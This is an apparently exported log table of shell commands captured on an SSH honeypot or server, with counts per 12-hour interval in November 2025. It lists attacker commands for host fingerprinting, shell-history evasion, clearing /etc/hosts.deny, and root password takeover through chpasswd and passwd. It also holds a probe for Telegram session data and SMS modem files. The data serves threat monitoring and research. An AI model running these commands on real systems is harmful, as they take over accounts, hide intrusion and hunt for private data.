Top 10000 values of input.keyword,@timestamp per 12 hours,Count of records
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,18/11/2025 12:00,1
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,19/11/2025 00:00,48
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,19/11/2025 12:00,2
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,20/11/2025 00:00,58
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,20/11/2025 12:00,6
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,21/11/2025 00:00,45
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,21/11/2025 12:00,4
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,22/11/2025 00:00,42
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,22/11/2025 12:00,26
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,23/11/2025 00:00,43
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,24/11/2025 00:00,10
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,25/11/2025 00:00,9
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,25/11/2025 12:00,28
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,26/11/2025 00:00,12
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,26/11/2025 12:00,2
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,27/11/2025 00:00,11
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,28/11/2025 00:00,1
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,28/11/2025 12:00,1
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,29/11/2025 00:00,13
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,29/11/2025 12:00,5
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,30/11/2025 00:00,24
/bin/./uname -s -v -n -r -m,15/11/2025 12:00,25
/bin/./uname -s -v -n -r -m,16/11/2025 00:00,3
/bin/./uname -s -v -n -r -m,17/11/2025 00:00,36
/bin/./uname -s -v -n -r -m,17/11/2025 12:00,9
/bin/./uname -s -v -n -r -m,18/11/2025 00:00,11
/bin/./uname -s -v -n -r -m,19/11/2025 00:00,33
/bin/./uname -s -v -n -r -m,20/11/2025 00:00,14
/bin/./uname -s -v -n -r -m,21/11/2025 00:00,18
/bin/./uname -s -v -n -r -m,21/11/2025 12:00,1
/bin/./uname -s -v -n -r -m,22/11/2025 00:00,19
/bin/./uname -s -v -n -r -m,22/11/2025 12:00,4
/bin/./uname -s -v -n -r -m,23/11/2025 00:00,23
/bin/./uname -s -v -n -r -m,23/11/2025 12:00,3
/bin/./uname -s -v -n -r -m,24/11/2025 00:00,23
/bin/./uname -s -v -n -r -m,24/11/2025 12:00,1
/bin/./uname -s -v -n -r -m,25/11/2025 00:00,17
/bin/./uname -s -v -n -r -m,25/11/2025 12:00,6
/bin/./uname -s -v -n -r -m,26/11/2025 00:00,23
/bin/./uname -s -v -n -r -m,26/11/2025 12:00,2
/bin/./uname -s -v -n -r -m,27/11/2025 00:00,21
/bin/./uname -s -v -n -r -m,28/11/2025 00:00,25
/bin/./uname -s -v -n -r -m,28/11/2025 12:00,4
/bin/./uname -s -v -n -r -m,29/11/2025 00:00,15
/bin/./uname -s -v -n -r -m,29/11/2025 12:00,11
/bin/./uname -s -v -n -r -m,30/11/2025 00:00,32
uname -s -v -n -m 2 > /dev/null,15/11/2025 00:00,5
uname -s -v -n -m 2 > /dev/null,15/11/2025 12:00,8
uname -s -v -n -m 2 > /dev/null,16/11/2025 00:00,1
uname -s -v -n -m 2 > /dev/null,17/11/2025 12:00,3
uname -s -v -n -m 2 > /dev/null,18/11/2025 00:00,2
uname -s -v -n -m 2 > /dev/null,19/11/2025 00:00,8
uname -s -v -n -m 2 > /dev/null,20/11/2025 00:00,1
uname -s -v -n -m 2 > /dev/null,21/11/2025 00:00,5
uname -s -v -n -m 2 > /dev/null,22/11/2025 12:00,1
uname -s -v -n -m 2 > /dev/null,23/11/2025 00:00,4
uname -s -v -n -m 2 > /dev/null,24/11/2025 00:00,7
uname -s -v -n -m 2 > /dev/null,24/11/2025 12:00,1
uname -s -v -n -m 2 > /dev/null,25/11/2025 12:00,1
uname -s -v -n -m 2 > /dev/null,26/11/2025 00:00,1
uname -s -v -n -m 2 > /dev/null,26/11/2025 12:00,1
uname -s -v -n -m 2 > /dev/null,28/11/2025 00:00,4
uname -s -v -n -m 2 > /dev/null,28/11/2025 12:00,1
uname -s -v -n -m 2 > /dev/null,29/11/2025 00:00,3
uname -s -v -n -m 2 > /dev/null,30/11/2025 00:00,4
uname -s -v -n -m 2 > /dev/null,30/11/2025 12:00,1
cat /proc/uptime 2 > /dev/null | cut -d. -f1,15/11/2025 00:00,5
cat /proc/uptime 2 > /dev/null | cut -d. -f1,17/11/2025 12:00,3
cat /proc/uptime 2 > /dev/null | cut -d. -f1,18/11/2025 00:00,2
cat /proc/uptime 2 > /dev/null | cut -d. -f1,19/11/2025 00:00,7
cat /proc/uptime 2 > /dev/null | cut -d. -f1,21/11/2025 00:00,5
cat /proc/uptime 2 > /dev/null | cut -d. -f1,23/11/2025 00:00,4
cat /proc/uptime 2 > /dev/null | cut -d. -f1,24/11/2025 00:00,7
cat /proc/uptime 2 > /dev/null | cut -d. -f1,24/11/2025 12:00,1
cat /proc/uptime 2 > /dev/null | cut -d. -f1,26/11/2025 00:00,1
cat /proc/uptime 2 > /dev/null | cut -d. -f1,28/11/2025 00:00,4
cat /proc/uptime 2 > /dev/null | cut -d. -f1,29/11/2025 00:00,3
cat /proc/uptime 2 > /dev/null | cut -d. -f1,30/11/2025 00:00,4
uname -m 2 > /dev/null,15/11/2025 00:00,5
uname -m 2 > /dev/null,17/11/2025 12:00,3
uname -m 2 > /dev/null,18/11/2025 00:00,2
uname -m 2 > /dev/null,19/11/2025 00:00,7
uname -m 2 > /dev/null,21/11/2025 00:00,5
uname -m 2 > /dev/null,23/11/2025 00:00,4
uname -m 2 > /dev/null,24/11/2025 00:00,7
uname -m 2 > /dev/null,24/11/2025 12:00,1
uname -m 2 > /dev/null,26/11/2025 00:00,1
uname -m 2 > /dev/null,28/11/2025 00:00,4
uname -m 2 > /dev/null,29/11/2025 00:00,3
uname -m 2 > /dev/null,30/11/2025 00:00,4
uname -s -v -n -r -m,15/11/2025 00:00,4
uname -s -v -n -r -m,15/11/2025 12:00,5
uname -s -v -n -r -m,16/11/2025 00:00,1
uname -s -v -n -r -m,17/11/2025 12:00,3
uname -s -v -n -r -m,18/11/2025 00:00,2
uname -s -v -n -r -m,18/11/2025 12:00,1
uname -s -v -n -r -m,19/11/2025 12:00,1
uname -s -v -n -r -m,20/11/2025 00:00,1
uname -s -v -n -r -m,22/11/2025 12:00,2
uname -s -v -n -r -m,24/11/2025 00:00,2
uname -s -v -n -r -m,26/11/2025 12:00,1
uname -s -v -n -r -m,27/11/2025 12:00,2
uname -s -v -n -r -m,28/11/2025 00:00,1
uname -s -v -n -r -m,28/11/2025 12:00,3
uname -s -v -n -r -m,29/11/2025 00:00,4
uname -s -v -n -r -m,30/11/2025 00:00,1
(empty),16/11/2025 00:00,1
(empty),21/11/2025 12:00,1
(empty),23/11/2025 00:00,1
(empty),24/11/2025 00:00,9
(empty),29/11/2025 00:00,3
echo 'SSH check',15/11/2025 00:00,1
echo 'SSH check',17/11/2025 12:00,1
echo 'SSH check',18/11/2025 00:00,1
echo 'SSH check',19/11/2025 00:00,1
echo 'SSH check',20/11/2025 00:00,1
echo 'SSH check',21/11/2025 00:00,1
echo 'SSH check',22/11/2025 00:00,1
echo 'SSH check',23/11/2025 00:00,1
echo 'SSH check',24/11/2025 00:00,1
echo 'SSH check',25/11/2025 00:00,1
echo 'SSH check',26/11/2025 00:00,1
echo 'SSH check',28/11/2025 00:00,1
echo 'SSH check',29/11/2025 12:00,1
echo 'SSH check',30/11/2025 00:00,1
"echo ""ERROR: BADtype: export""",24/11/2025 00:00,9
exit,24/11/2025 00:00,9
export HISTFILE=/dev/null,24/11/2025 00:00,9
export HISTSAVE=/dev/null,24/11/2025 00:00,9
if ! type export >/dev/null 2>&1; then,24/11/2025 00:00,9
unset HISTFILE,24/11/2025 00:00,9
unset HISTSAVE,24/11/2025 00:00,9
/ip cloud print,17/11/2025 12:00,1
/ip cloud print,20/11/2025 00:00,1
/ip cloud print,21/11/2025 00:00,1
/ip cloud print,25/11/2025 12:00,1
/ip cloud print,29/11/2025 12:00,2
"cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps
",16/11/2025 00:00,1
"cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps
",21/11/2025 12:00,1
"cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps
",23/11/2025 00:00,1
"cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps
",29/11/2025 00:00,3
cat /proc/cpuinfo,17/11/2025 12:00,1
cat /proc/cpuinfo,20/11/2025 00:00,1
cat /proc/cpuinfo,21/11/2025 00:00,1
cat /proc/cpuinfo,25/11/2025 12:00,1
cat /proc/cpuinfo,29/11/2025 12:00,2
"echo ""cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps"" | sh",16/11/2025 00:00,1
"echo ""cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps"" | sh",21/11/2025 12:00,1
"echo ""cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps"" | sh",23/11/2025 00:00,1
"echo ""cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps"" | sh",29/11/2025 00:00,3
echo Hi | cat -n,17/11/2025 12:00,1
echo Hi | cat -n,20/11/2025 00:00,1
echo Hi | cat -n,21/11/2025 00:00,1
echo Hi | cat -n,25/11/2025 12:00,1
echo Hi | cat -n,29/11/2025 12:00,2
ifconfig,17/11/2025 12:00,1
ifconfig,20/11/2025 00:00,1
ifconfig,21/11/2025 00:00,1
ifconfig,25/11/2025 12:00,1
ifconfig,29/11/2025 12:00,2
locate D877F783D5D3EF8Cs,17/11/2025 12:00,1
locate D877F783D5D3EF8Cs,20/11/2025 00:00,1
locate D877F783D5D3EF8Cs,21/11/2025 00:00,1
locate D877F783D5D3EF8Cs,25/11/2025 12:00,1
locate D877F783D5D3EF8Cs,29/11/2025 12:00,2
ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*,17/11/2025 12:00,1
ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*,20/11/2025 00:00,1
ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*,21/11/2025 00:00,1
ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*,25/11/2025 12:00,1
ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*,29/11/2025 12:00,2
ps -ef | grep '[Mm]iner',17/11/2025 12:00,1
ps -ef | grep '[Mm]iner',20/11/2025 00:00,1
ps -ef | grep '[Mm]iner',21/11/2025 00:00,1
ps -ef | grep '[Mm]iner',25/11/2025 12:00,1
ps -ef | grep '[Mm]iner',29/11/2025 12:00,2
ps | grep '[Mm]iner',17/11/2025 12:00,1
ps | grep '[Mm]iner',20/11/2025 00:00,1
ps | grep '[Mm]iner',21/11/2025 00:00,1
ps | grep '[Mm]iner',25/11/2025 12:00,1
ps | grep '[Mm]iner',29/11/2025 12:00,2
uname -s -m,25/11/2025 00:00,1
uname -s -m,26/11/2025 12:00,1
uname -s -m,29/11/2025 00:00,1
uname -s -m,30/11/2025 00:00,1
echo SHELL_TEST,26/11/2025 12:00,1
echo SHELL_TEST,29/11/2025 00:00,1
echo SHELL_TEST,29/11/2025 12:00,1
hostname,18/11/2025 12:00,1
hostname,22/11/2025 12:00,1
hostname,29/11/2025 00:00,1
pwd,15/11/2025 00:00,1
pwd,17/11/2025 12:00,1
pwd,22/11/2025 00:00,1
uptime,15/11/2025 00:00,1
uptime,18/11/2025 00:00,1
uptime,21/11/2025 00:00,1
"echo ""root:UCqjwcbhHlDp""|chpasswd|bash",25/11/2025 12:00,2
"echo ""root:rmU7SXyRvX5U""|chpasswd|bash",21/11/2025 00:00,2
"echo -e ""\x6F\x6B""",21/11/2025 12:00,1
"echo -e ""\x6F\x6B""",27/11/2025 00:00,1
env | head -10,30/11/2025 00:00,2
history | tail -5,22/11/2025 00:00,1
history | tail -5,22/11/2025 12:00,1
"echo ""!QAZ2wsx3edc\nQIca27fd18kj\nQIca27fd18kj\n""|passwd",22/11/2025 12:00,1
"echo ""!QAZ2wsx3edc\nQfauuyVUELnL\nQfauuyVUELnL\n""|passwd",22/11/2025 12:00,1
"echo ""!QAZ2wsx3edc\nixR6KLGpaABa\nixR6KLGpaABa\n""|passwd",22/11/2025 12:00,1
"echo ""!\n2CZ5da5GmmiH\n2CZ5da5GmmiH\n""|passwd",21/11/2025 12:00,1
"echo ""!\n3kJTZluATxLs\n3kJTZluATxLs\n""|passwd",18/11/2025 00:00,1
"echo ""!\n7Y6dDH3DOCBI\n7Y6dDH3DOCBI\n""|passwd",18/11/2025 00:00,1
"echo ""111\nxl21LohGrdM0\nxl21LohGrdM0\n""|passwd",17/11/2025 00:00,1
"echo ""112233\nTbGuzbf67Sqa\nTbGuzbf67Sqa\n""|passwd",17/11/2025 12:00,1
"echo ""123123\n96gxFMcGDkgG\n96gxFMcGDkgG\n""|passwd",17/11/2025 12:00,1
"echo ""123456789\nJJA3l0eiYSmz\nJJA3l0eiYSmz\n""|passwd",30/11/2025 00:00,1
"echo ""123456789\nJNsPIxh3Ux2N\nJNsPIxh3Ux2N\n""|passwd",20/11/2025 00:00,1
"echo ""123456789\nVfgwGQZTTc2C\nVfgwGQZTTc2C\n""|passwd",20/11/2025 00:00,1
"echo ""12345678\n2ulvuCcgW67h\n2ulvuCcgW67h\n""|passwd",15/11/2025 12:00,1
"echo ""12345678\n8YV8ajsovdq5\n8YV8ajsovdq5\n""|passwd",17/11/2025 12:00,1
"echo ""12345678\nBo8Iu29jFoAu\nBo8Iu29jFoAu\n""|passwd",22/11/2025 12:00,1
"echo ""12345678\nK7JrMi3BzKn7\nK7JrMi3BzKn7\n""|passwd",22/11/2025 00:00,1
"echo ""12345678\nRjh2Ifv73SwO\nRjh2Ifv73SwO\n""|passwd",22/11/2025 12:00,1
"echo ""12345678\naAOawzuvpaxs\naAOawzuvpaxs\n""|passwd",17/11/2025 12:00,1
"echo ""12345678\nb9bGBSPUnWwd\nb9bGBSPUnWwd\n""|passwd",15/11/2025 12:00,1
"echo ""12345678\ngbkRyL7cZXHO\ngbkRyL7cZXHO\n""|passwd",21/11/2025 00:00,1
"echo ""12345678\nn3MJ3OWUwL4i\nn3MJ3OWUwL4i\n""|passwd",22/11/2025 12:00,1
"echo ""12345678\nwjofCIqJ3Ykp\nwjofCIqJ3Ykp\n""|passwd",20/11/2025 12:00,1
"echo ""12345678\nxszH02L6jH1P\nxszH02L6jH1P\n""|passwd",15/11/2025 12:00,1
"echo ""123456\n0QJFwKQwiJ9D\n0QJFwKQwiJ9D\n""|passwd",18/11/2025 00:00,1
"echo ""123456\n1DqMgQQcPYYt\n1DqMgQQcPYYt\n""|passwd",30/11/2025 12:00,1
"echo ""123456\n1jA9JtsvtBZg\n1jA9JtsvtBZg\n""|passwd",25/11/2025 00:00,1
"echo ""123456\n2WovIJExACsn\n2WovIJExACsn\n""|passwd",25/11/2025 12:00,1
"echo ""123456\n2cdgDo57je00\n2cdgDo57je00\n""|passwd",18/11/2025 00:00,1
"echo ""123456\n4IehPJzmD9s2\n4IehPJzmD9s2\n""|passwd",30/11/2025 00:00,1
"echo ""123456\n4apl5ehVBQbf\n4apl5ehVBQbf\n""|passwd",16/11/2025 00:00,1
"echo ""123456\n6kJBTaMAY2BN\n6kJBTaMAY2BN\n""|passwd",20/11/2025 00:00,1
"echo ""123456\n7Dh3t5I9qqPD\n7Dh3t5I9qqPD\n""|passwd",24/11/2025 00:00,1
"echo ""123456\n84ayP4Xsj60M\n84ayP4Xsj60M\n""|passwd",20/11/2025 00:00,1
"echo ""123456\n8wzG6As1Rqer\n8wzG6As1Rqer\n""|passwd",27/11/2025 00:00,1
"echo ""123456\nALKOF0VMm7g8\nALKOF0VMm7g8\n""|passwd",19/11/2025 12:00,1
"echo ""123456\nATeqThCYqGtr\nATeqThCYqGtr\n""|passwd",29/11/2025 12:00,1
"echo ""123456\nAzPvvjCZmicy\nAzPvvjCZmicy\n""|passwd",30/11/2025 00:00,1
"echo ""123456\nAzSnDLx0fANP\nAzSnDLx0fANP\n""|passwd",30/11/2025 00:00,1
"echo ""123456\nBIqHY9FzxMwC\nBIqHY9FzxMwC\n""|passwd",19/11/2025 00:00,1
"echo ""123456\nC7IaufR4EFMH\nC7IaufR4EFMH\n""|passwd",19/11/2025 00:00,1
"echo ""123456\nDQDQQfj8Jpig\nDQDQQfj8Jpig\n""|passwd",19/11/2025 00:00,1
"echo ""123456\nEEU029eH5usZ\nEEU029eH5usZ\n""|passwd",26/11/2025 00:00,1
"echo ""123456\nEiqJMHnRj6fs\nEiqJMHnRj6fs\n""|passwd",27/11/2025 00:00,1
"echo ""123456\nF8IuSfPMUGef\nF8IuSfPMUGef\n""|passwd",15/11/2025 00:00,1
"echo ""123456\nFay7jE0MkOfw\nFay7jE0MkOfw\n""|passwd",25/11/2025 12:00,1
"echo ""123456\nG1scn8O20SjB\nG1scn8O20SjB\n""|passwd",19/11/2025 00:00,1
"echo ""123456\nHaQGXkQbnKQ1\nHaQGXkQbnKQ1\n""|passwd",20/11/2025 00:00,1
"echo ""123456\nJeFfuSeMRlRG\nJeFfuSeMRlRG\n""|passwd",30/11/2025 12:00,1
"echo ""123456\nKtmGHqUPCQQw\nKtmGHqUPCQQw\n""|passwd",26/11/2025 12:00,1
"echo ""123456\nLDQvvHYTw7eE\nLDQvvHYTw7eE\n""|passwd",20/11/2025 00:00,1
"echo ""123456\nLaM7r80C8buP\nLaM7r80C8buP\n""|passwd",24/11/2025 00:00,1
"echo ""123456\nLo1FTgLA7FCo\nLo1FTgLA7FCo\n""|passwd",25/11/2025 12:00,1
"echo ""123456\nLoPEBA2GthVP\nLoPEBA2GthVP\n""|passwd",27/11/2025 00:00,1
"echo ""123456\nNnPj3EkrUQGZ\nNnPj3EkrUQGZ\n""|passwd",25/11/2025 12:00,1
"echo ""123456\nR9UfgSoFgjXI\nR9UfgSoFgjXI\n""|passwd",26/11/2025 00:00,1
"echo ""123456\nRBxBJM1ZpMrf\nRBxBJM1ZpMrf\n""|passwd",15/11/2025 00:00,1
"echo ""123456\nRvbpKERcNjZe\nRvbpKERcNjZe\n""|passwd",26/11/2025 00:00,1
"echo ""123456\nTM7rw8NrNnz4\nTM7rw8NrNnz4\n""|passwd",20/11/2025 00:00,1
"echo ""123456\nTuO8qLgMdO7J\nTuO8qLgMdO7J\n""|passwd",30/11/2025 00:00,1
"echo ""123456\nWrxXXCCWXxhZ\nWrxXXCCWXxhZ\n""|passwd",19/11/2025 00:00,1
"echo ""123456\nXe7yjaHsNyyQ\nXe7yjaHsNyyQ\n""|passwd",20/11/2025 00:00,1
"echo ""123456\nXyziz8eWdVYp\nXyziz8eWdVYp\n""|passwd",20/11/2025 00:00,1
"echo ""123456\nY3zga1sJQu6K\nY3zga1sJQu6K\n""|passwd",26/11/2025 00:00,1
"echo ""123456\nYKAXTeMjs45r\nYKAXTeMjs45r\n""|passwd",30/11/2025 00:00,1
"echo ""123456\nYVtyiFSrjIKa\nYVtyiFSrjIKa\n""|passwd",19/11/2025 00:00,1
"echo ""123456\nZLI4d0Bx9wCd\nZLI4d0Bx9wCd\n""|passwd",30/11/2025 00:00,1
"echo ""123456\nZXe65nJoFFRG\nZXe65nJoFFRG\n""|passwd",26/11/2025 00:00,1
"echo ""123456\nZfZhEpgYwYGb\nZfZhEpgYwYGb\n""|passwd",30/11/2025 00:00,1
"echo ""123456\nZmGbF76WlQgg\nZmGbF76WlQgg\n""|passwd",20/11/2025 00:00,1
"echo ""123456\naOgCYpqJFhx3\naOgCYpqJFhx3\n""|passwd",25/11/2025 12:00,1
"echo ""123456\nbO4pYqP3RQ09\nbO4pYqP3RQ09\n""|passwd",19/11/2025 00:00,1
"echo ""123456\nbijT10IoDOzx\nbijT10IoDOzx\n""|passwd",18/11/2025 00:00,1
"echo ""123456\nepKJuW6hlSOF\nepKJuW6hlSOF\n""|passwd",29/11/2025 12:00,1
"echo ""123456\nfstG8co9ITNl\nfstG8co9ITNl\n""|passwd",30/11/2025 12:00,1
"echo ""123456\ngSnHH5SGtcaK\ngSnHH5SGtcaK\n""|passwd",19/11/2025 00:00,1
"echo ""123456\nhZKsGmzgDUC7\nhZKsGmzgDUC7\n""|passwd",30/11/2025 00:00,1
"echo ""123456\njkFqYZ8bA5iZ\njkFqYZ8bA5iZ\n""|passwd",30/11/2025 00:00,1
"echo ""123456\nkQbGQ4Iowue1\nkQbGQ4Iowue1\n""|passwd",30/11/2025 00:00,1
"echo ""123456\nlnPWQaNSUJSp\nlnPWQaNSUJSp\n""|passwd",19/11/2025 00:00,1
"echo ""123456\nlsMEJ0agc1Xj\nlsMEJ0agc1Xj\n""|passwd",19/11/2025 00:00,1
"echo ""123456\nm8UWDuqCUz3d\nm8UWDuqCUz3d\n""|passwd",20/11/2025 00:00,1
"echo ""123456\nmEKFvmHSmFDj\nmEKFvmHSmFDj\n""|passwd",30/11/2025 00:00,1
"echo ""123456\nmX8IQF7vFPkf\nmX8IQF7vFPkf\n""|passwd",20/11/2025 12:00,1
"echo ""123456\nnGV1TIh3Ouvl\nnGV1TIh3Ouvl\n""|passwd",29/11/2025 12:00,1
"echo ""123456\nnWixgjRqUBSk\nnWixgjRqUBSk\n""|passwd",25/11/2025 12:00,1
"echo ""123456\noEqzgtvwqfbv\noEqzgtvwqfbv\n""|passwd",20/11/2025 00:00,1
"echo ""123456\nopfcEAguAzZu\nopfcEAguAzZu\n""|passwd",23/11/2025 00:00,1
"echo ""123456\np82VbwIXziFe\np82VbwIXziFe\n""|passwd",25/11/2025 12:00,1
"echo ""123456\nrmU5IKI17QOe\nrmU5IKI17QOe\n""|passwd",26/11/2025 00:00,1
"echo ""123456\nsW8aNCRL2n2Q\nsW8aNCRL2n2Q\n""|passwd",25/11/2025 12:00,1
"echo ""123456\nvHbM469fdIMR\nvHbM469fdIMR\n""|passwd",20/11/2025 00:00,1
"echo ""123456\nw8zKnUT2OKRi\nw8zKnUT2OKRi\n""|passwd",30/11/2025 00:00,1
"echo ""123456\nwdfFP0paC2Rq\nwdfFP0paC2Rq\n""|passwd",18/11/2025 00:00,1
"echo ""123456\nwu5JQXIRp6qh\nwu5JQXIRp6qh\n""|passwd",19/11/2025 00:00,1
"echo ""123456\nx4qbJa5kioBM\nx4qbJa5kioBM\n""|passwd",30/11/2025 00:00,1
"echo ""12345\nmziyiDk3C8fS\nmziyiDk3C8fS\n""|passwd",19/11/2025 00:00,1
"echo ""12345\no0ldjph8yChd\no0ldjph8yChd\n""|passwd",20/11/2025 00:00,1
"echo ""1234\n0L59OI2A9mbA\n0L59OI2A9mbA\n""|passwd",19/11/2025 00:00,1
"echo ""1234\n1lE8j6goZvXP\n1lE8j6goZvXP\n""|passwd",15/11/2025 12:00,1
"echo ""1234\n1sVHuooWus2M\n1sVHuooWus2M\n""|passwd",28/11/2025 00:00,1
"echo ""1234\n3wV5bkjH2YxU\n3wV5bkjH2YxU\n""|passwd",19/11/2025 00:00,1
"echo ""1234\n4yfBa4j02TLx\n4yfBa4j02TLx\n""|passwd",15/11/2025 00:00,1
"echo ""1234\n6AhhVIJ8Jhke\n6AhhVIJ8Jhke\n""|passwd",22/11/2025 00:00,1
"echo ""1234\n7BVY5HjrTkoK\n7BVY5HjrTkoK\n""|passwd",19/11/2025 00:00,1
"echo ""1234\nCGYRi6ej0pdU\nCGYRi6ej0pdU\n""|passwd",25/11/2025 12:00,1
"echo ""1234\nUtGK4d4hTZg1\nUtGK4d4hTZg1\n""|passwd",22/11/2025 00:00,1
"echo ""1234\nXol9RBDIXAEh\nXol9RBDIXAEh\n""|passwd",22/11/2025 00:00,1
"echo ""1234\nbihvnJwkNNM5\nbihvnJwkNNM5\n""|passwd",15/11/2025 00:00,1
"echo ""1234\nmmvsKO6xhS0S\nmmvsKO6xhS0S\n""|passwd",23/11/2025 00:00,1
"echo ""1234\nvqfP5kGg42zr\nvqfP5kGg42zr\n""|passwd",22/11/2025 12:00,1
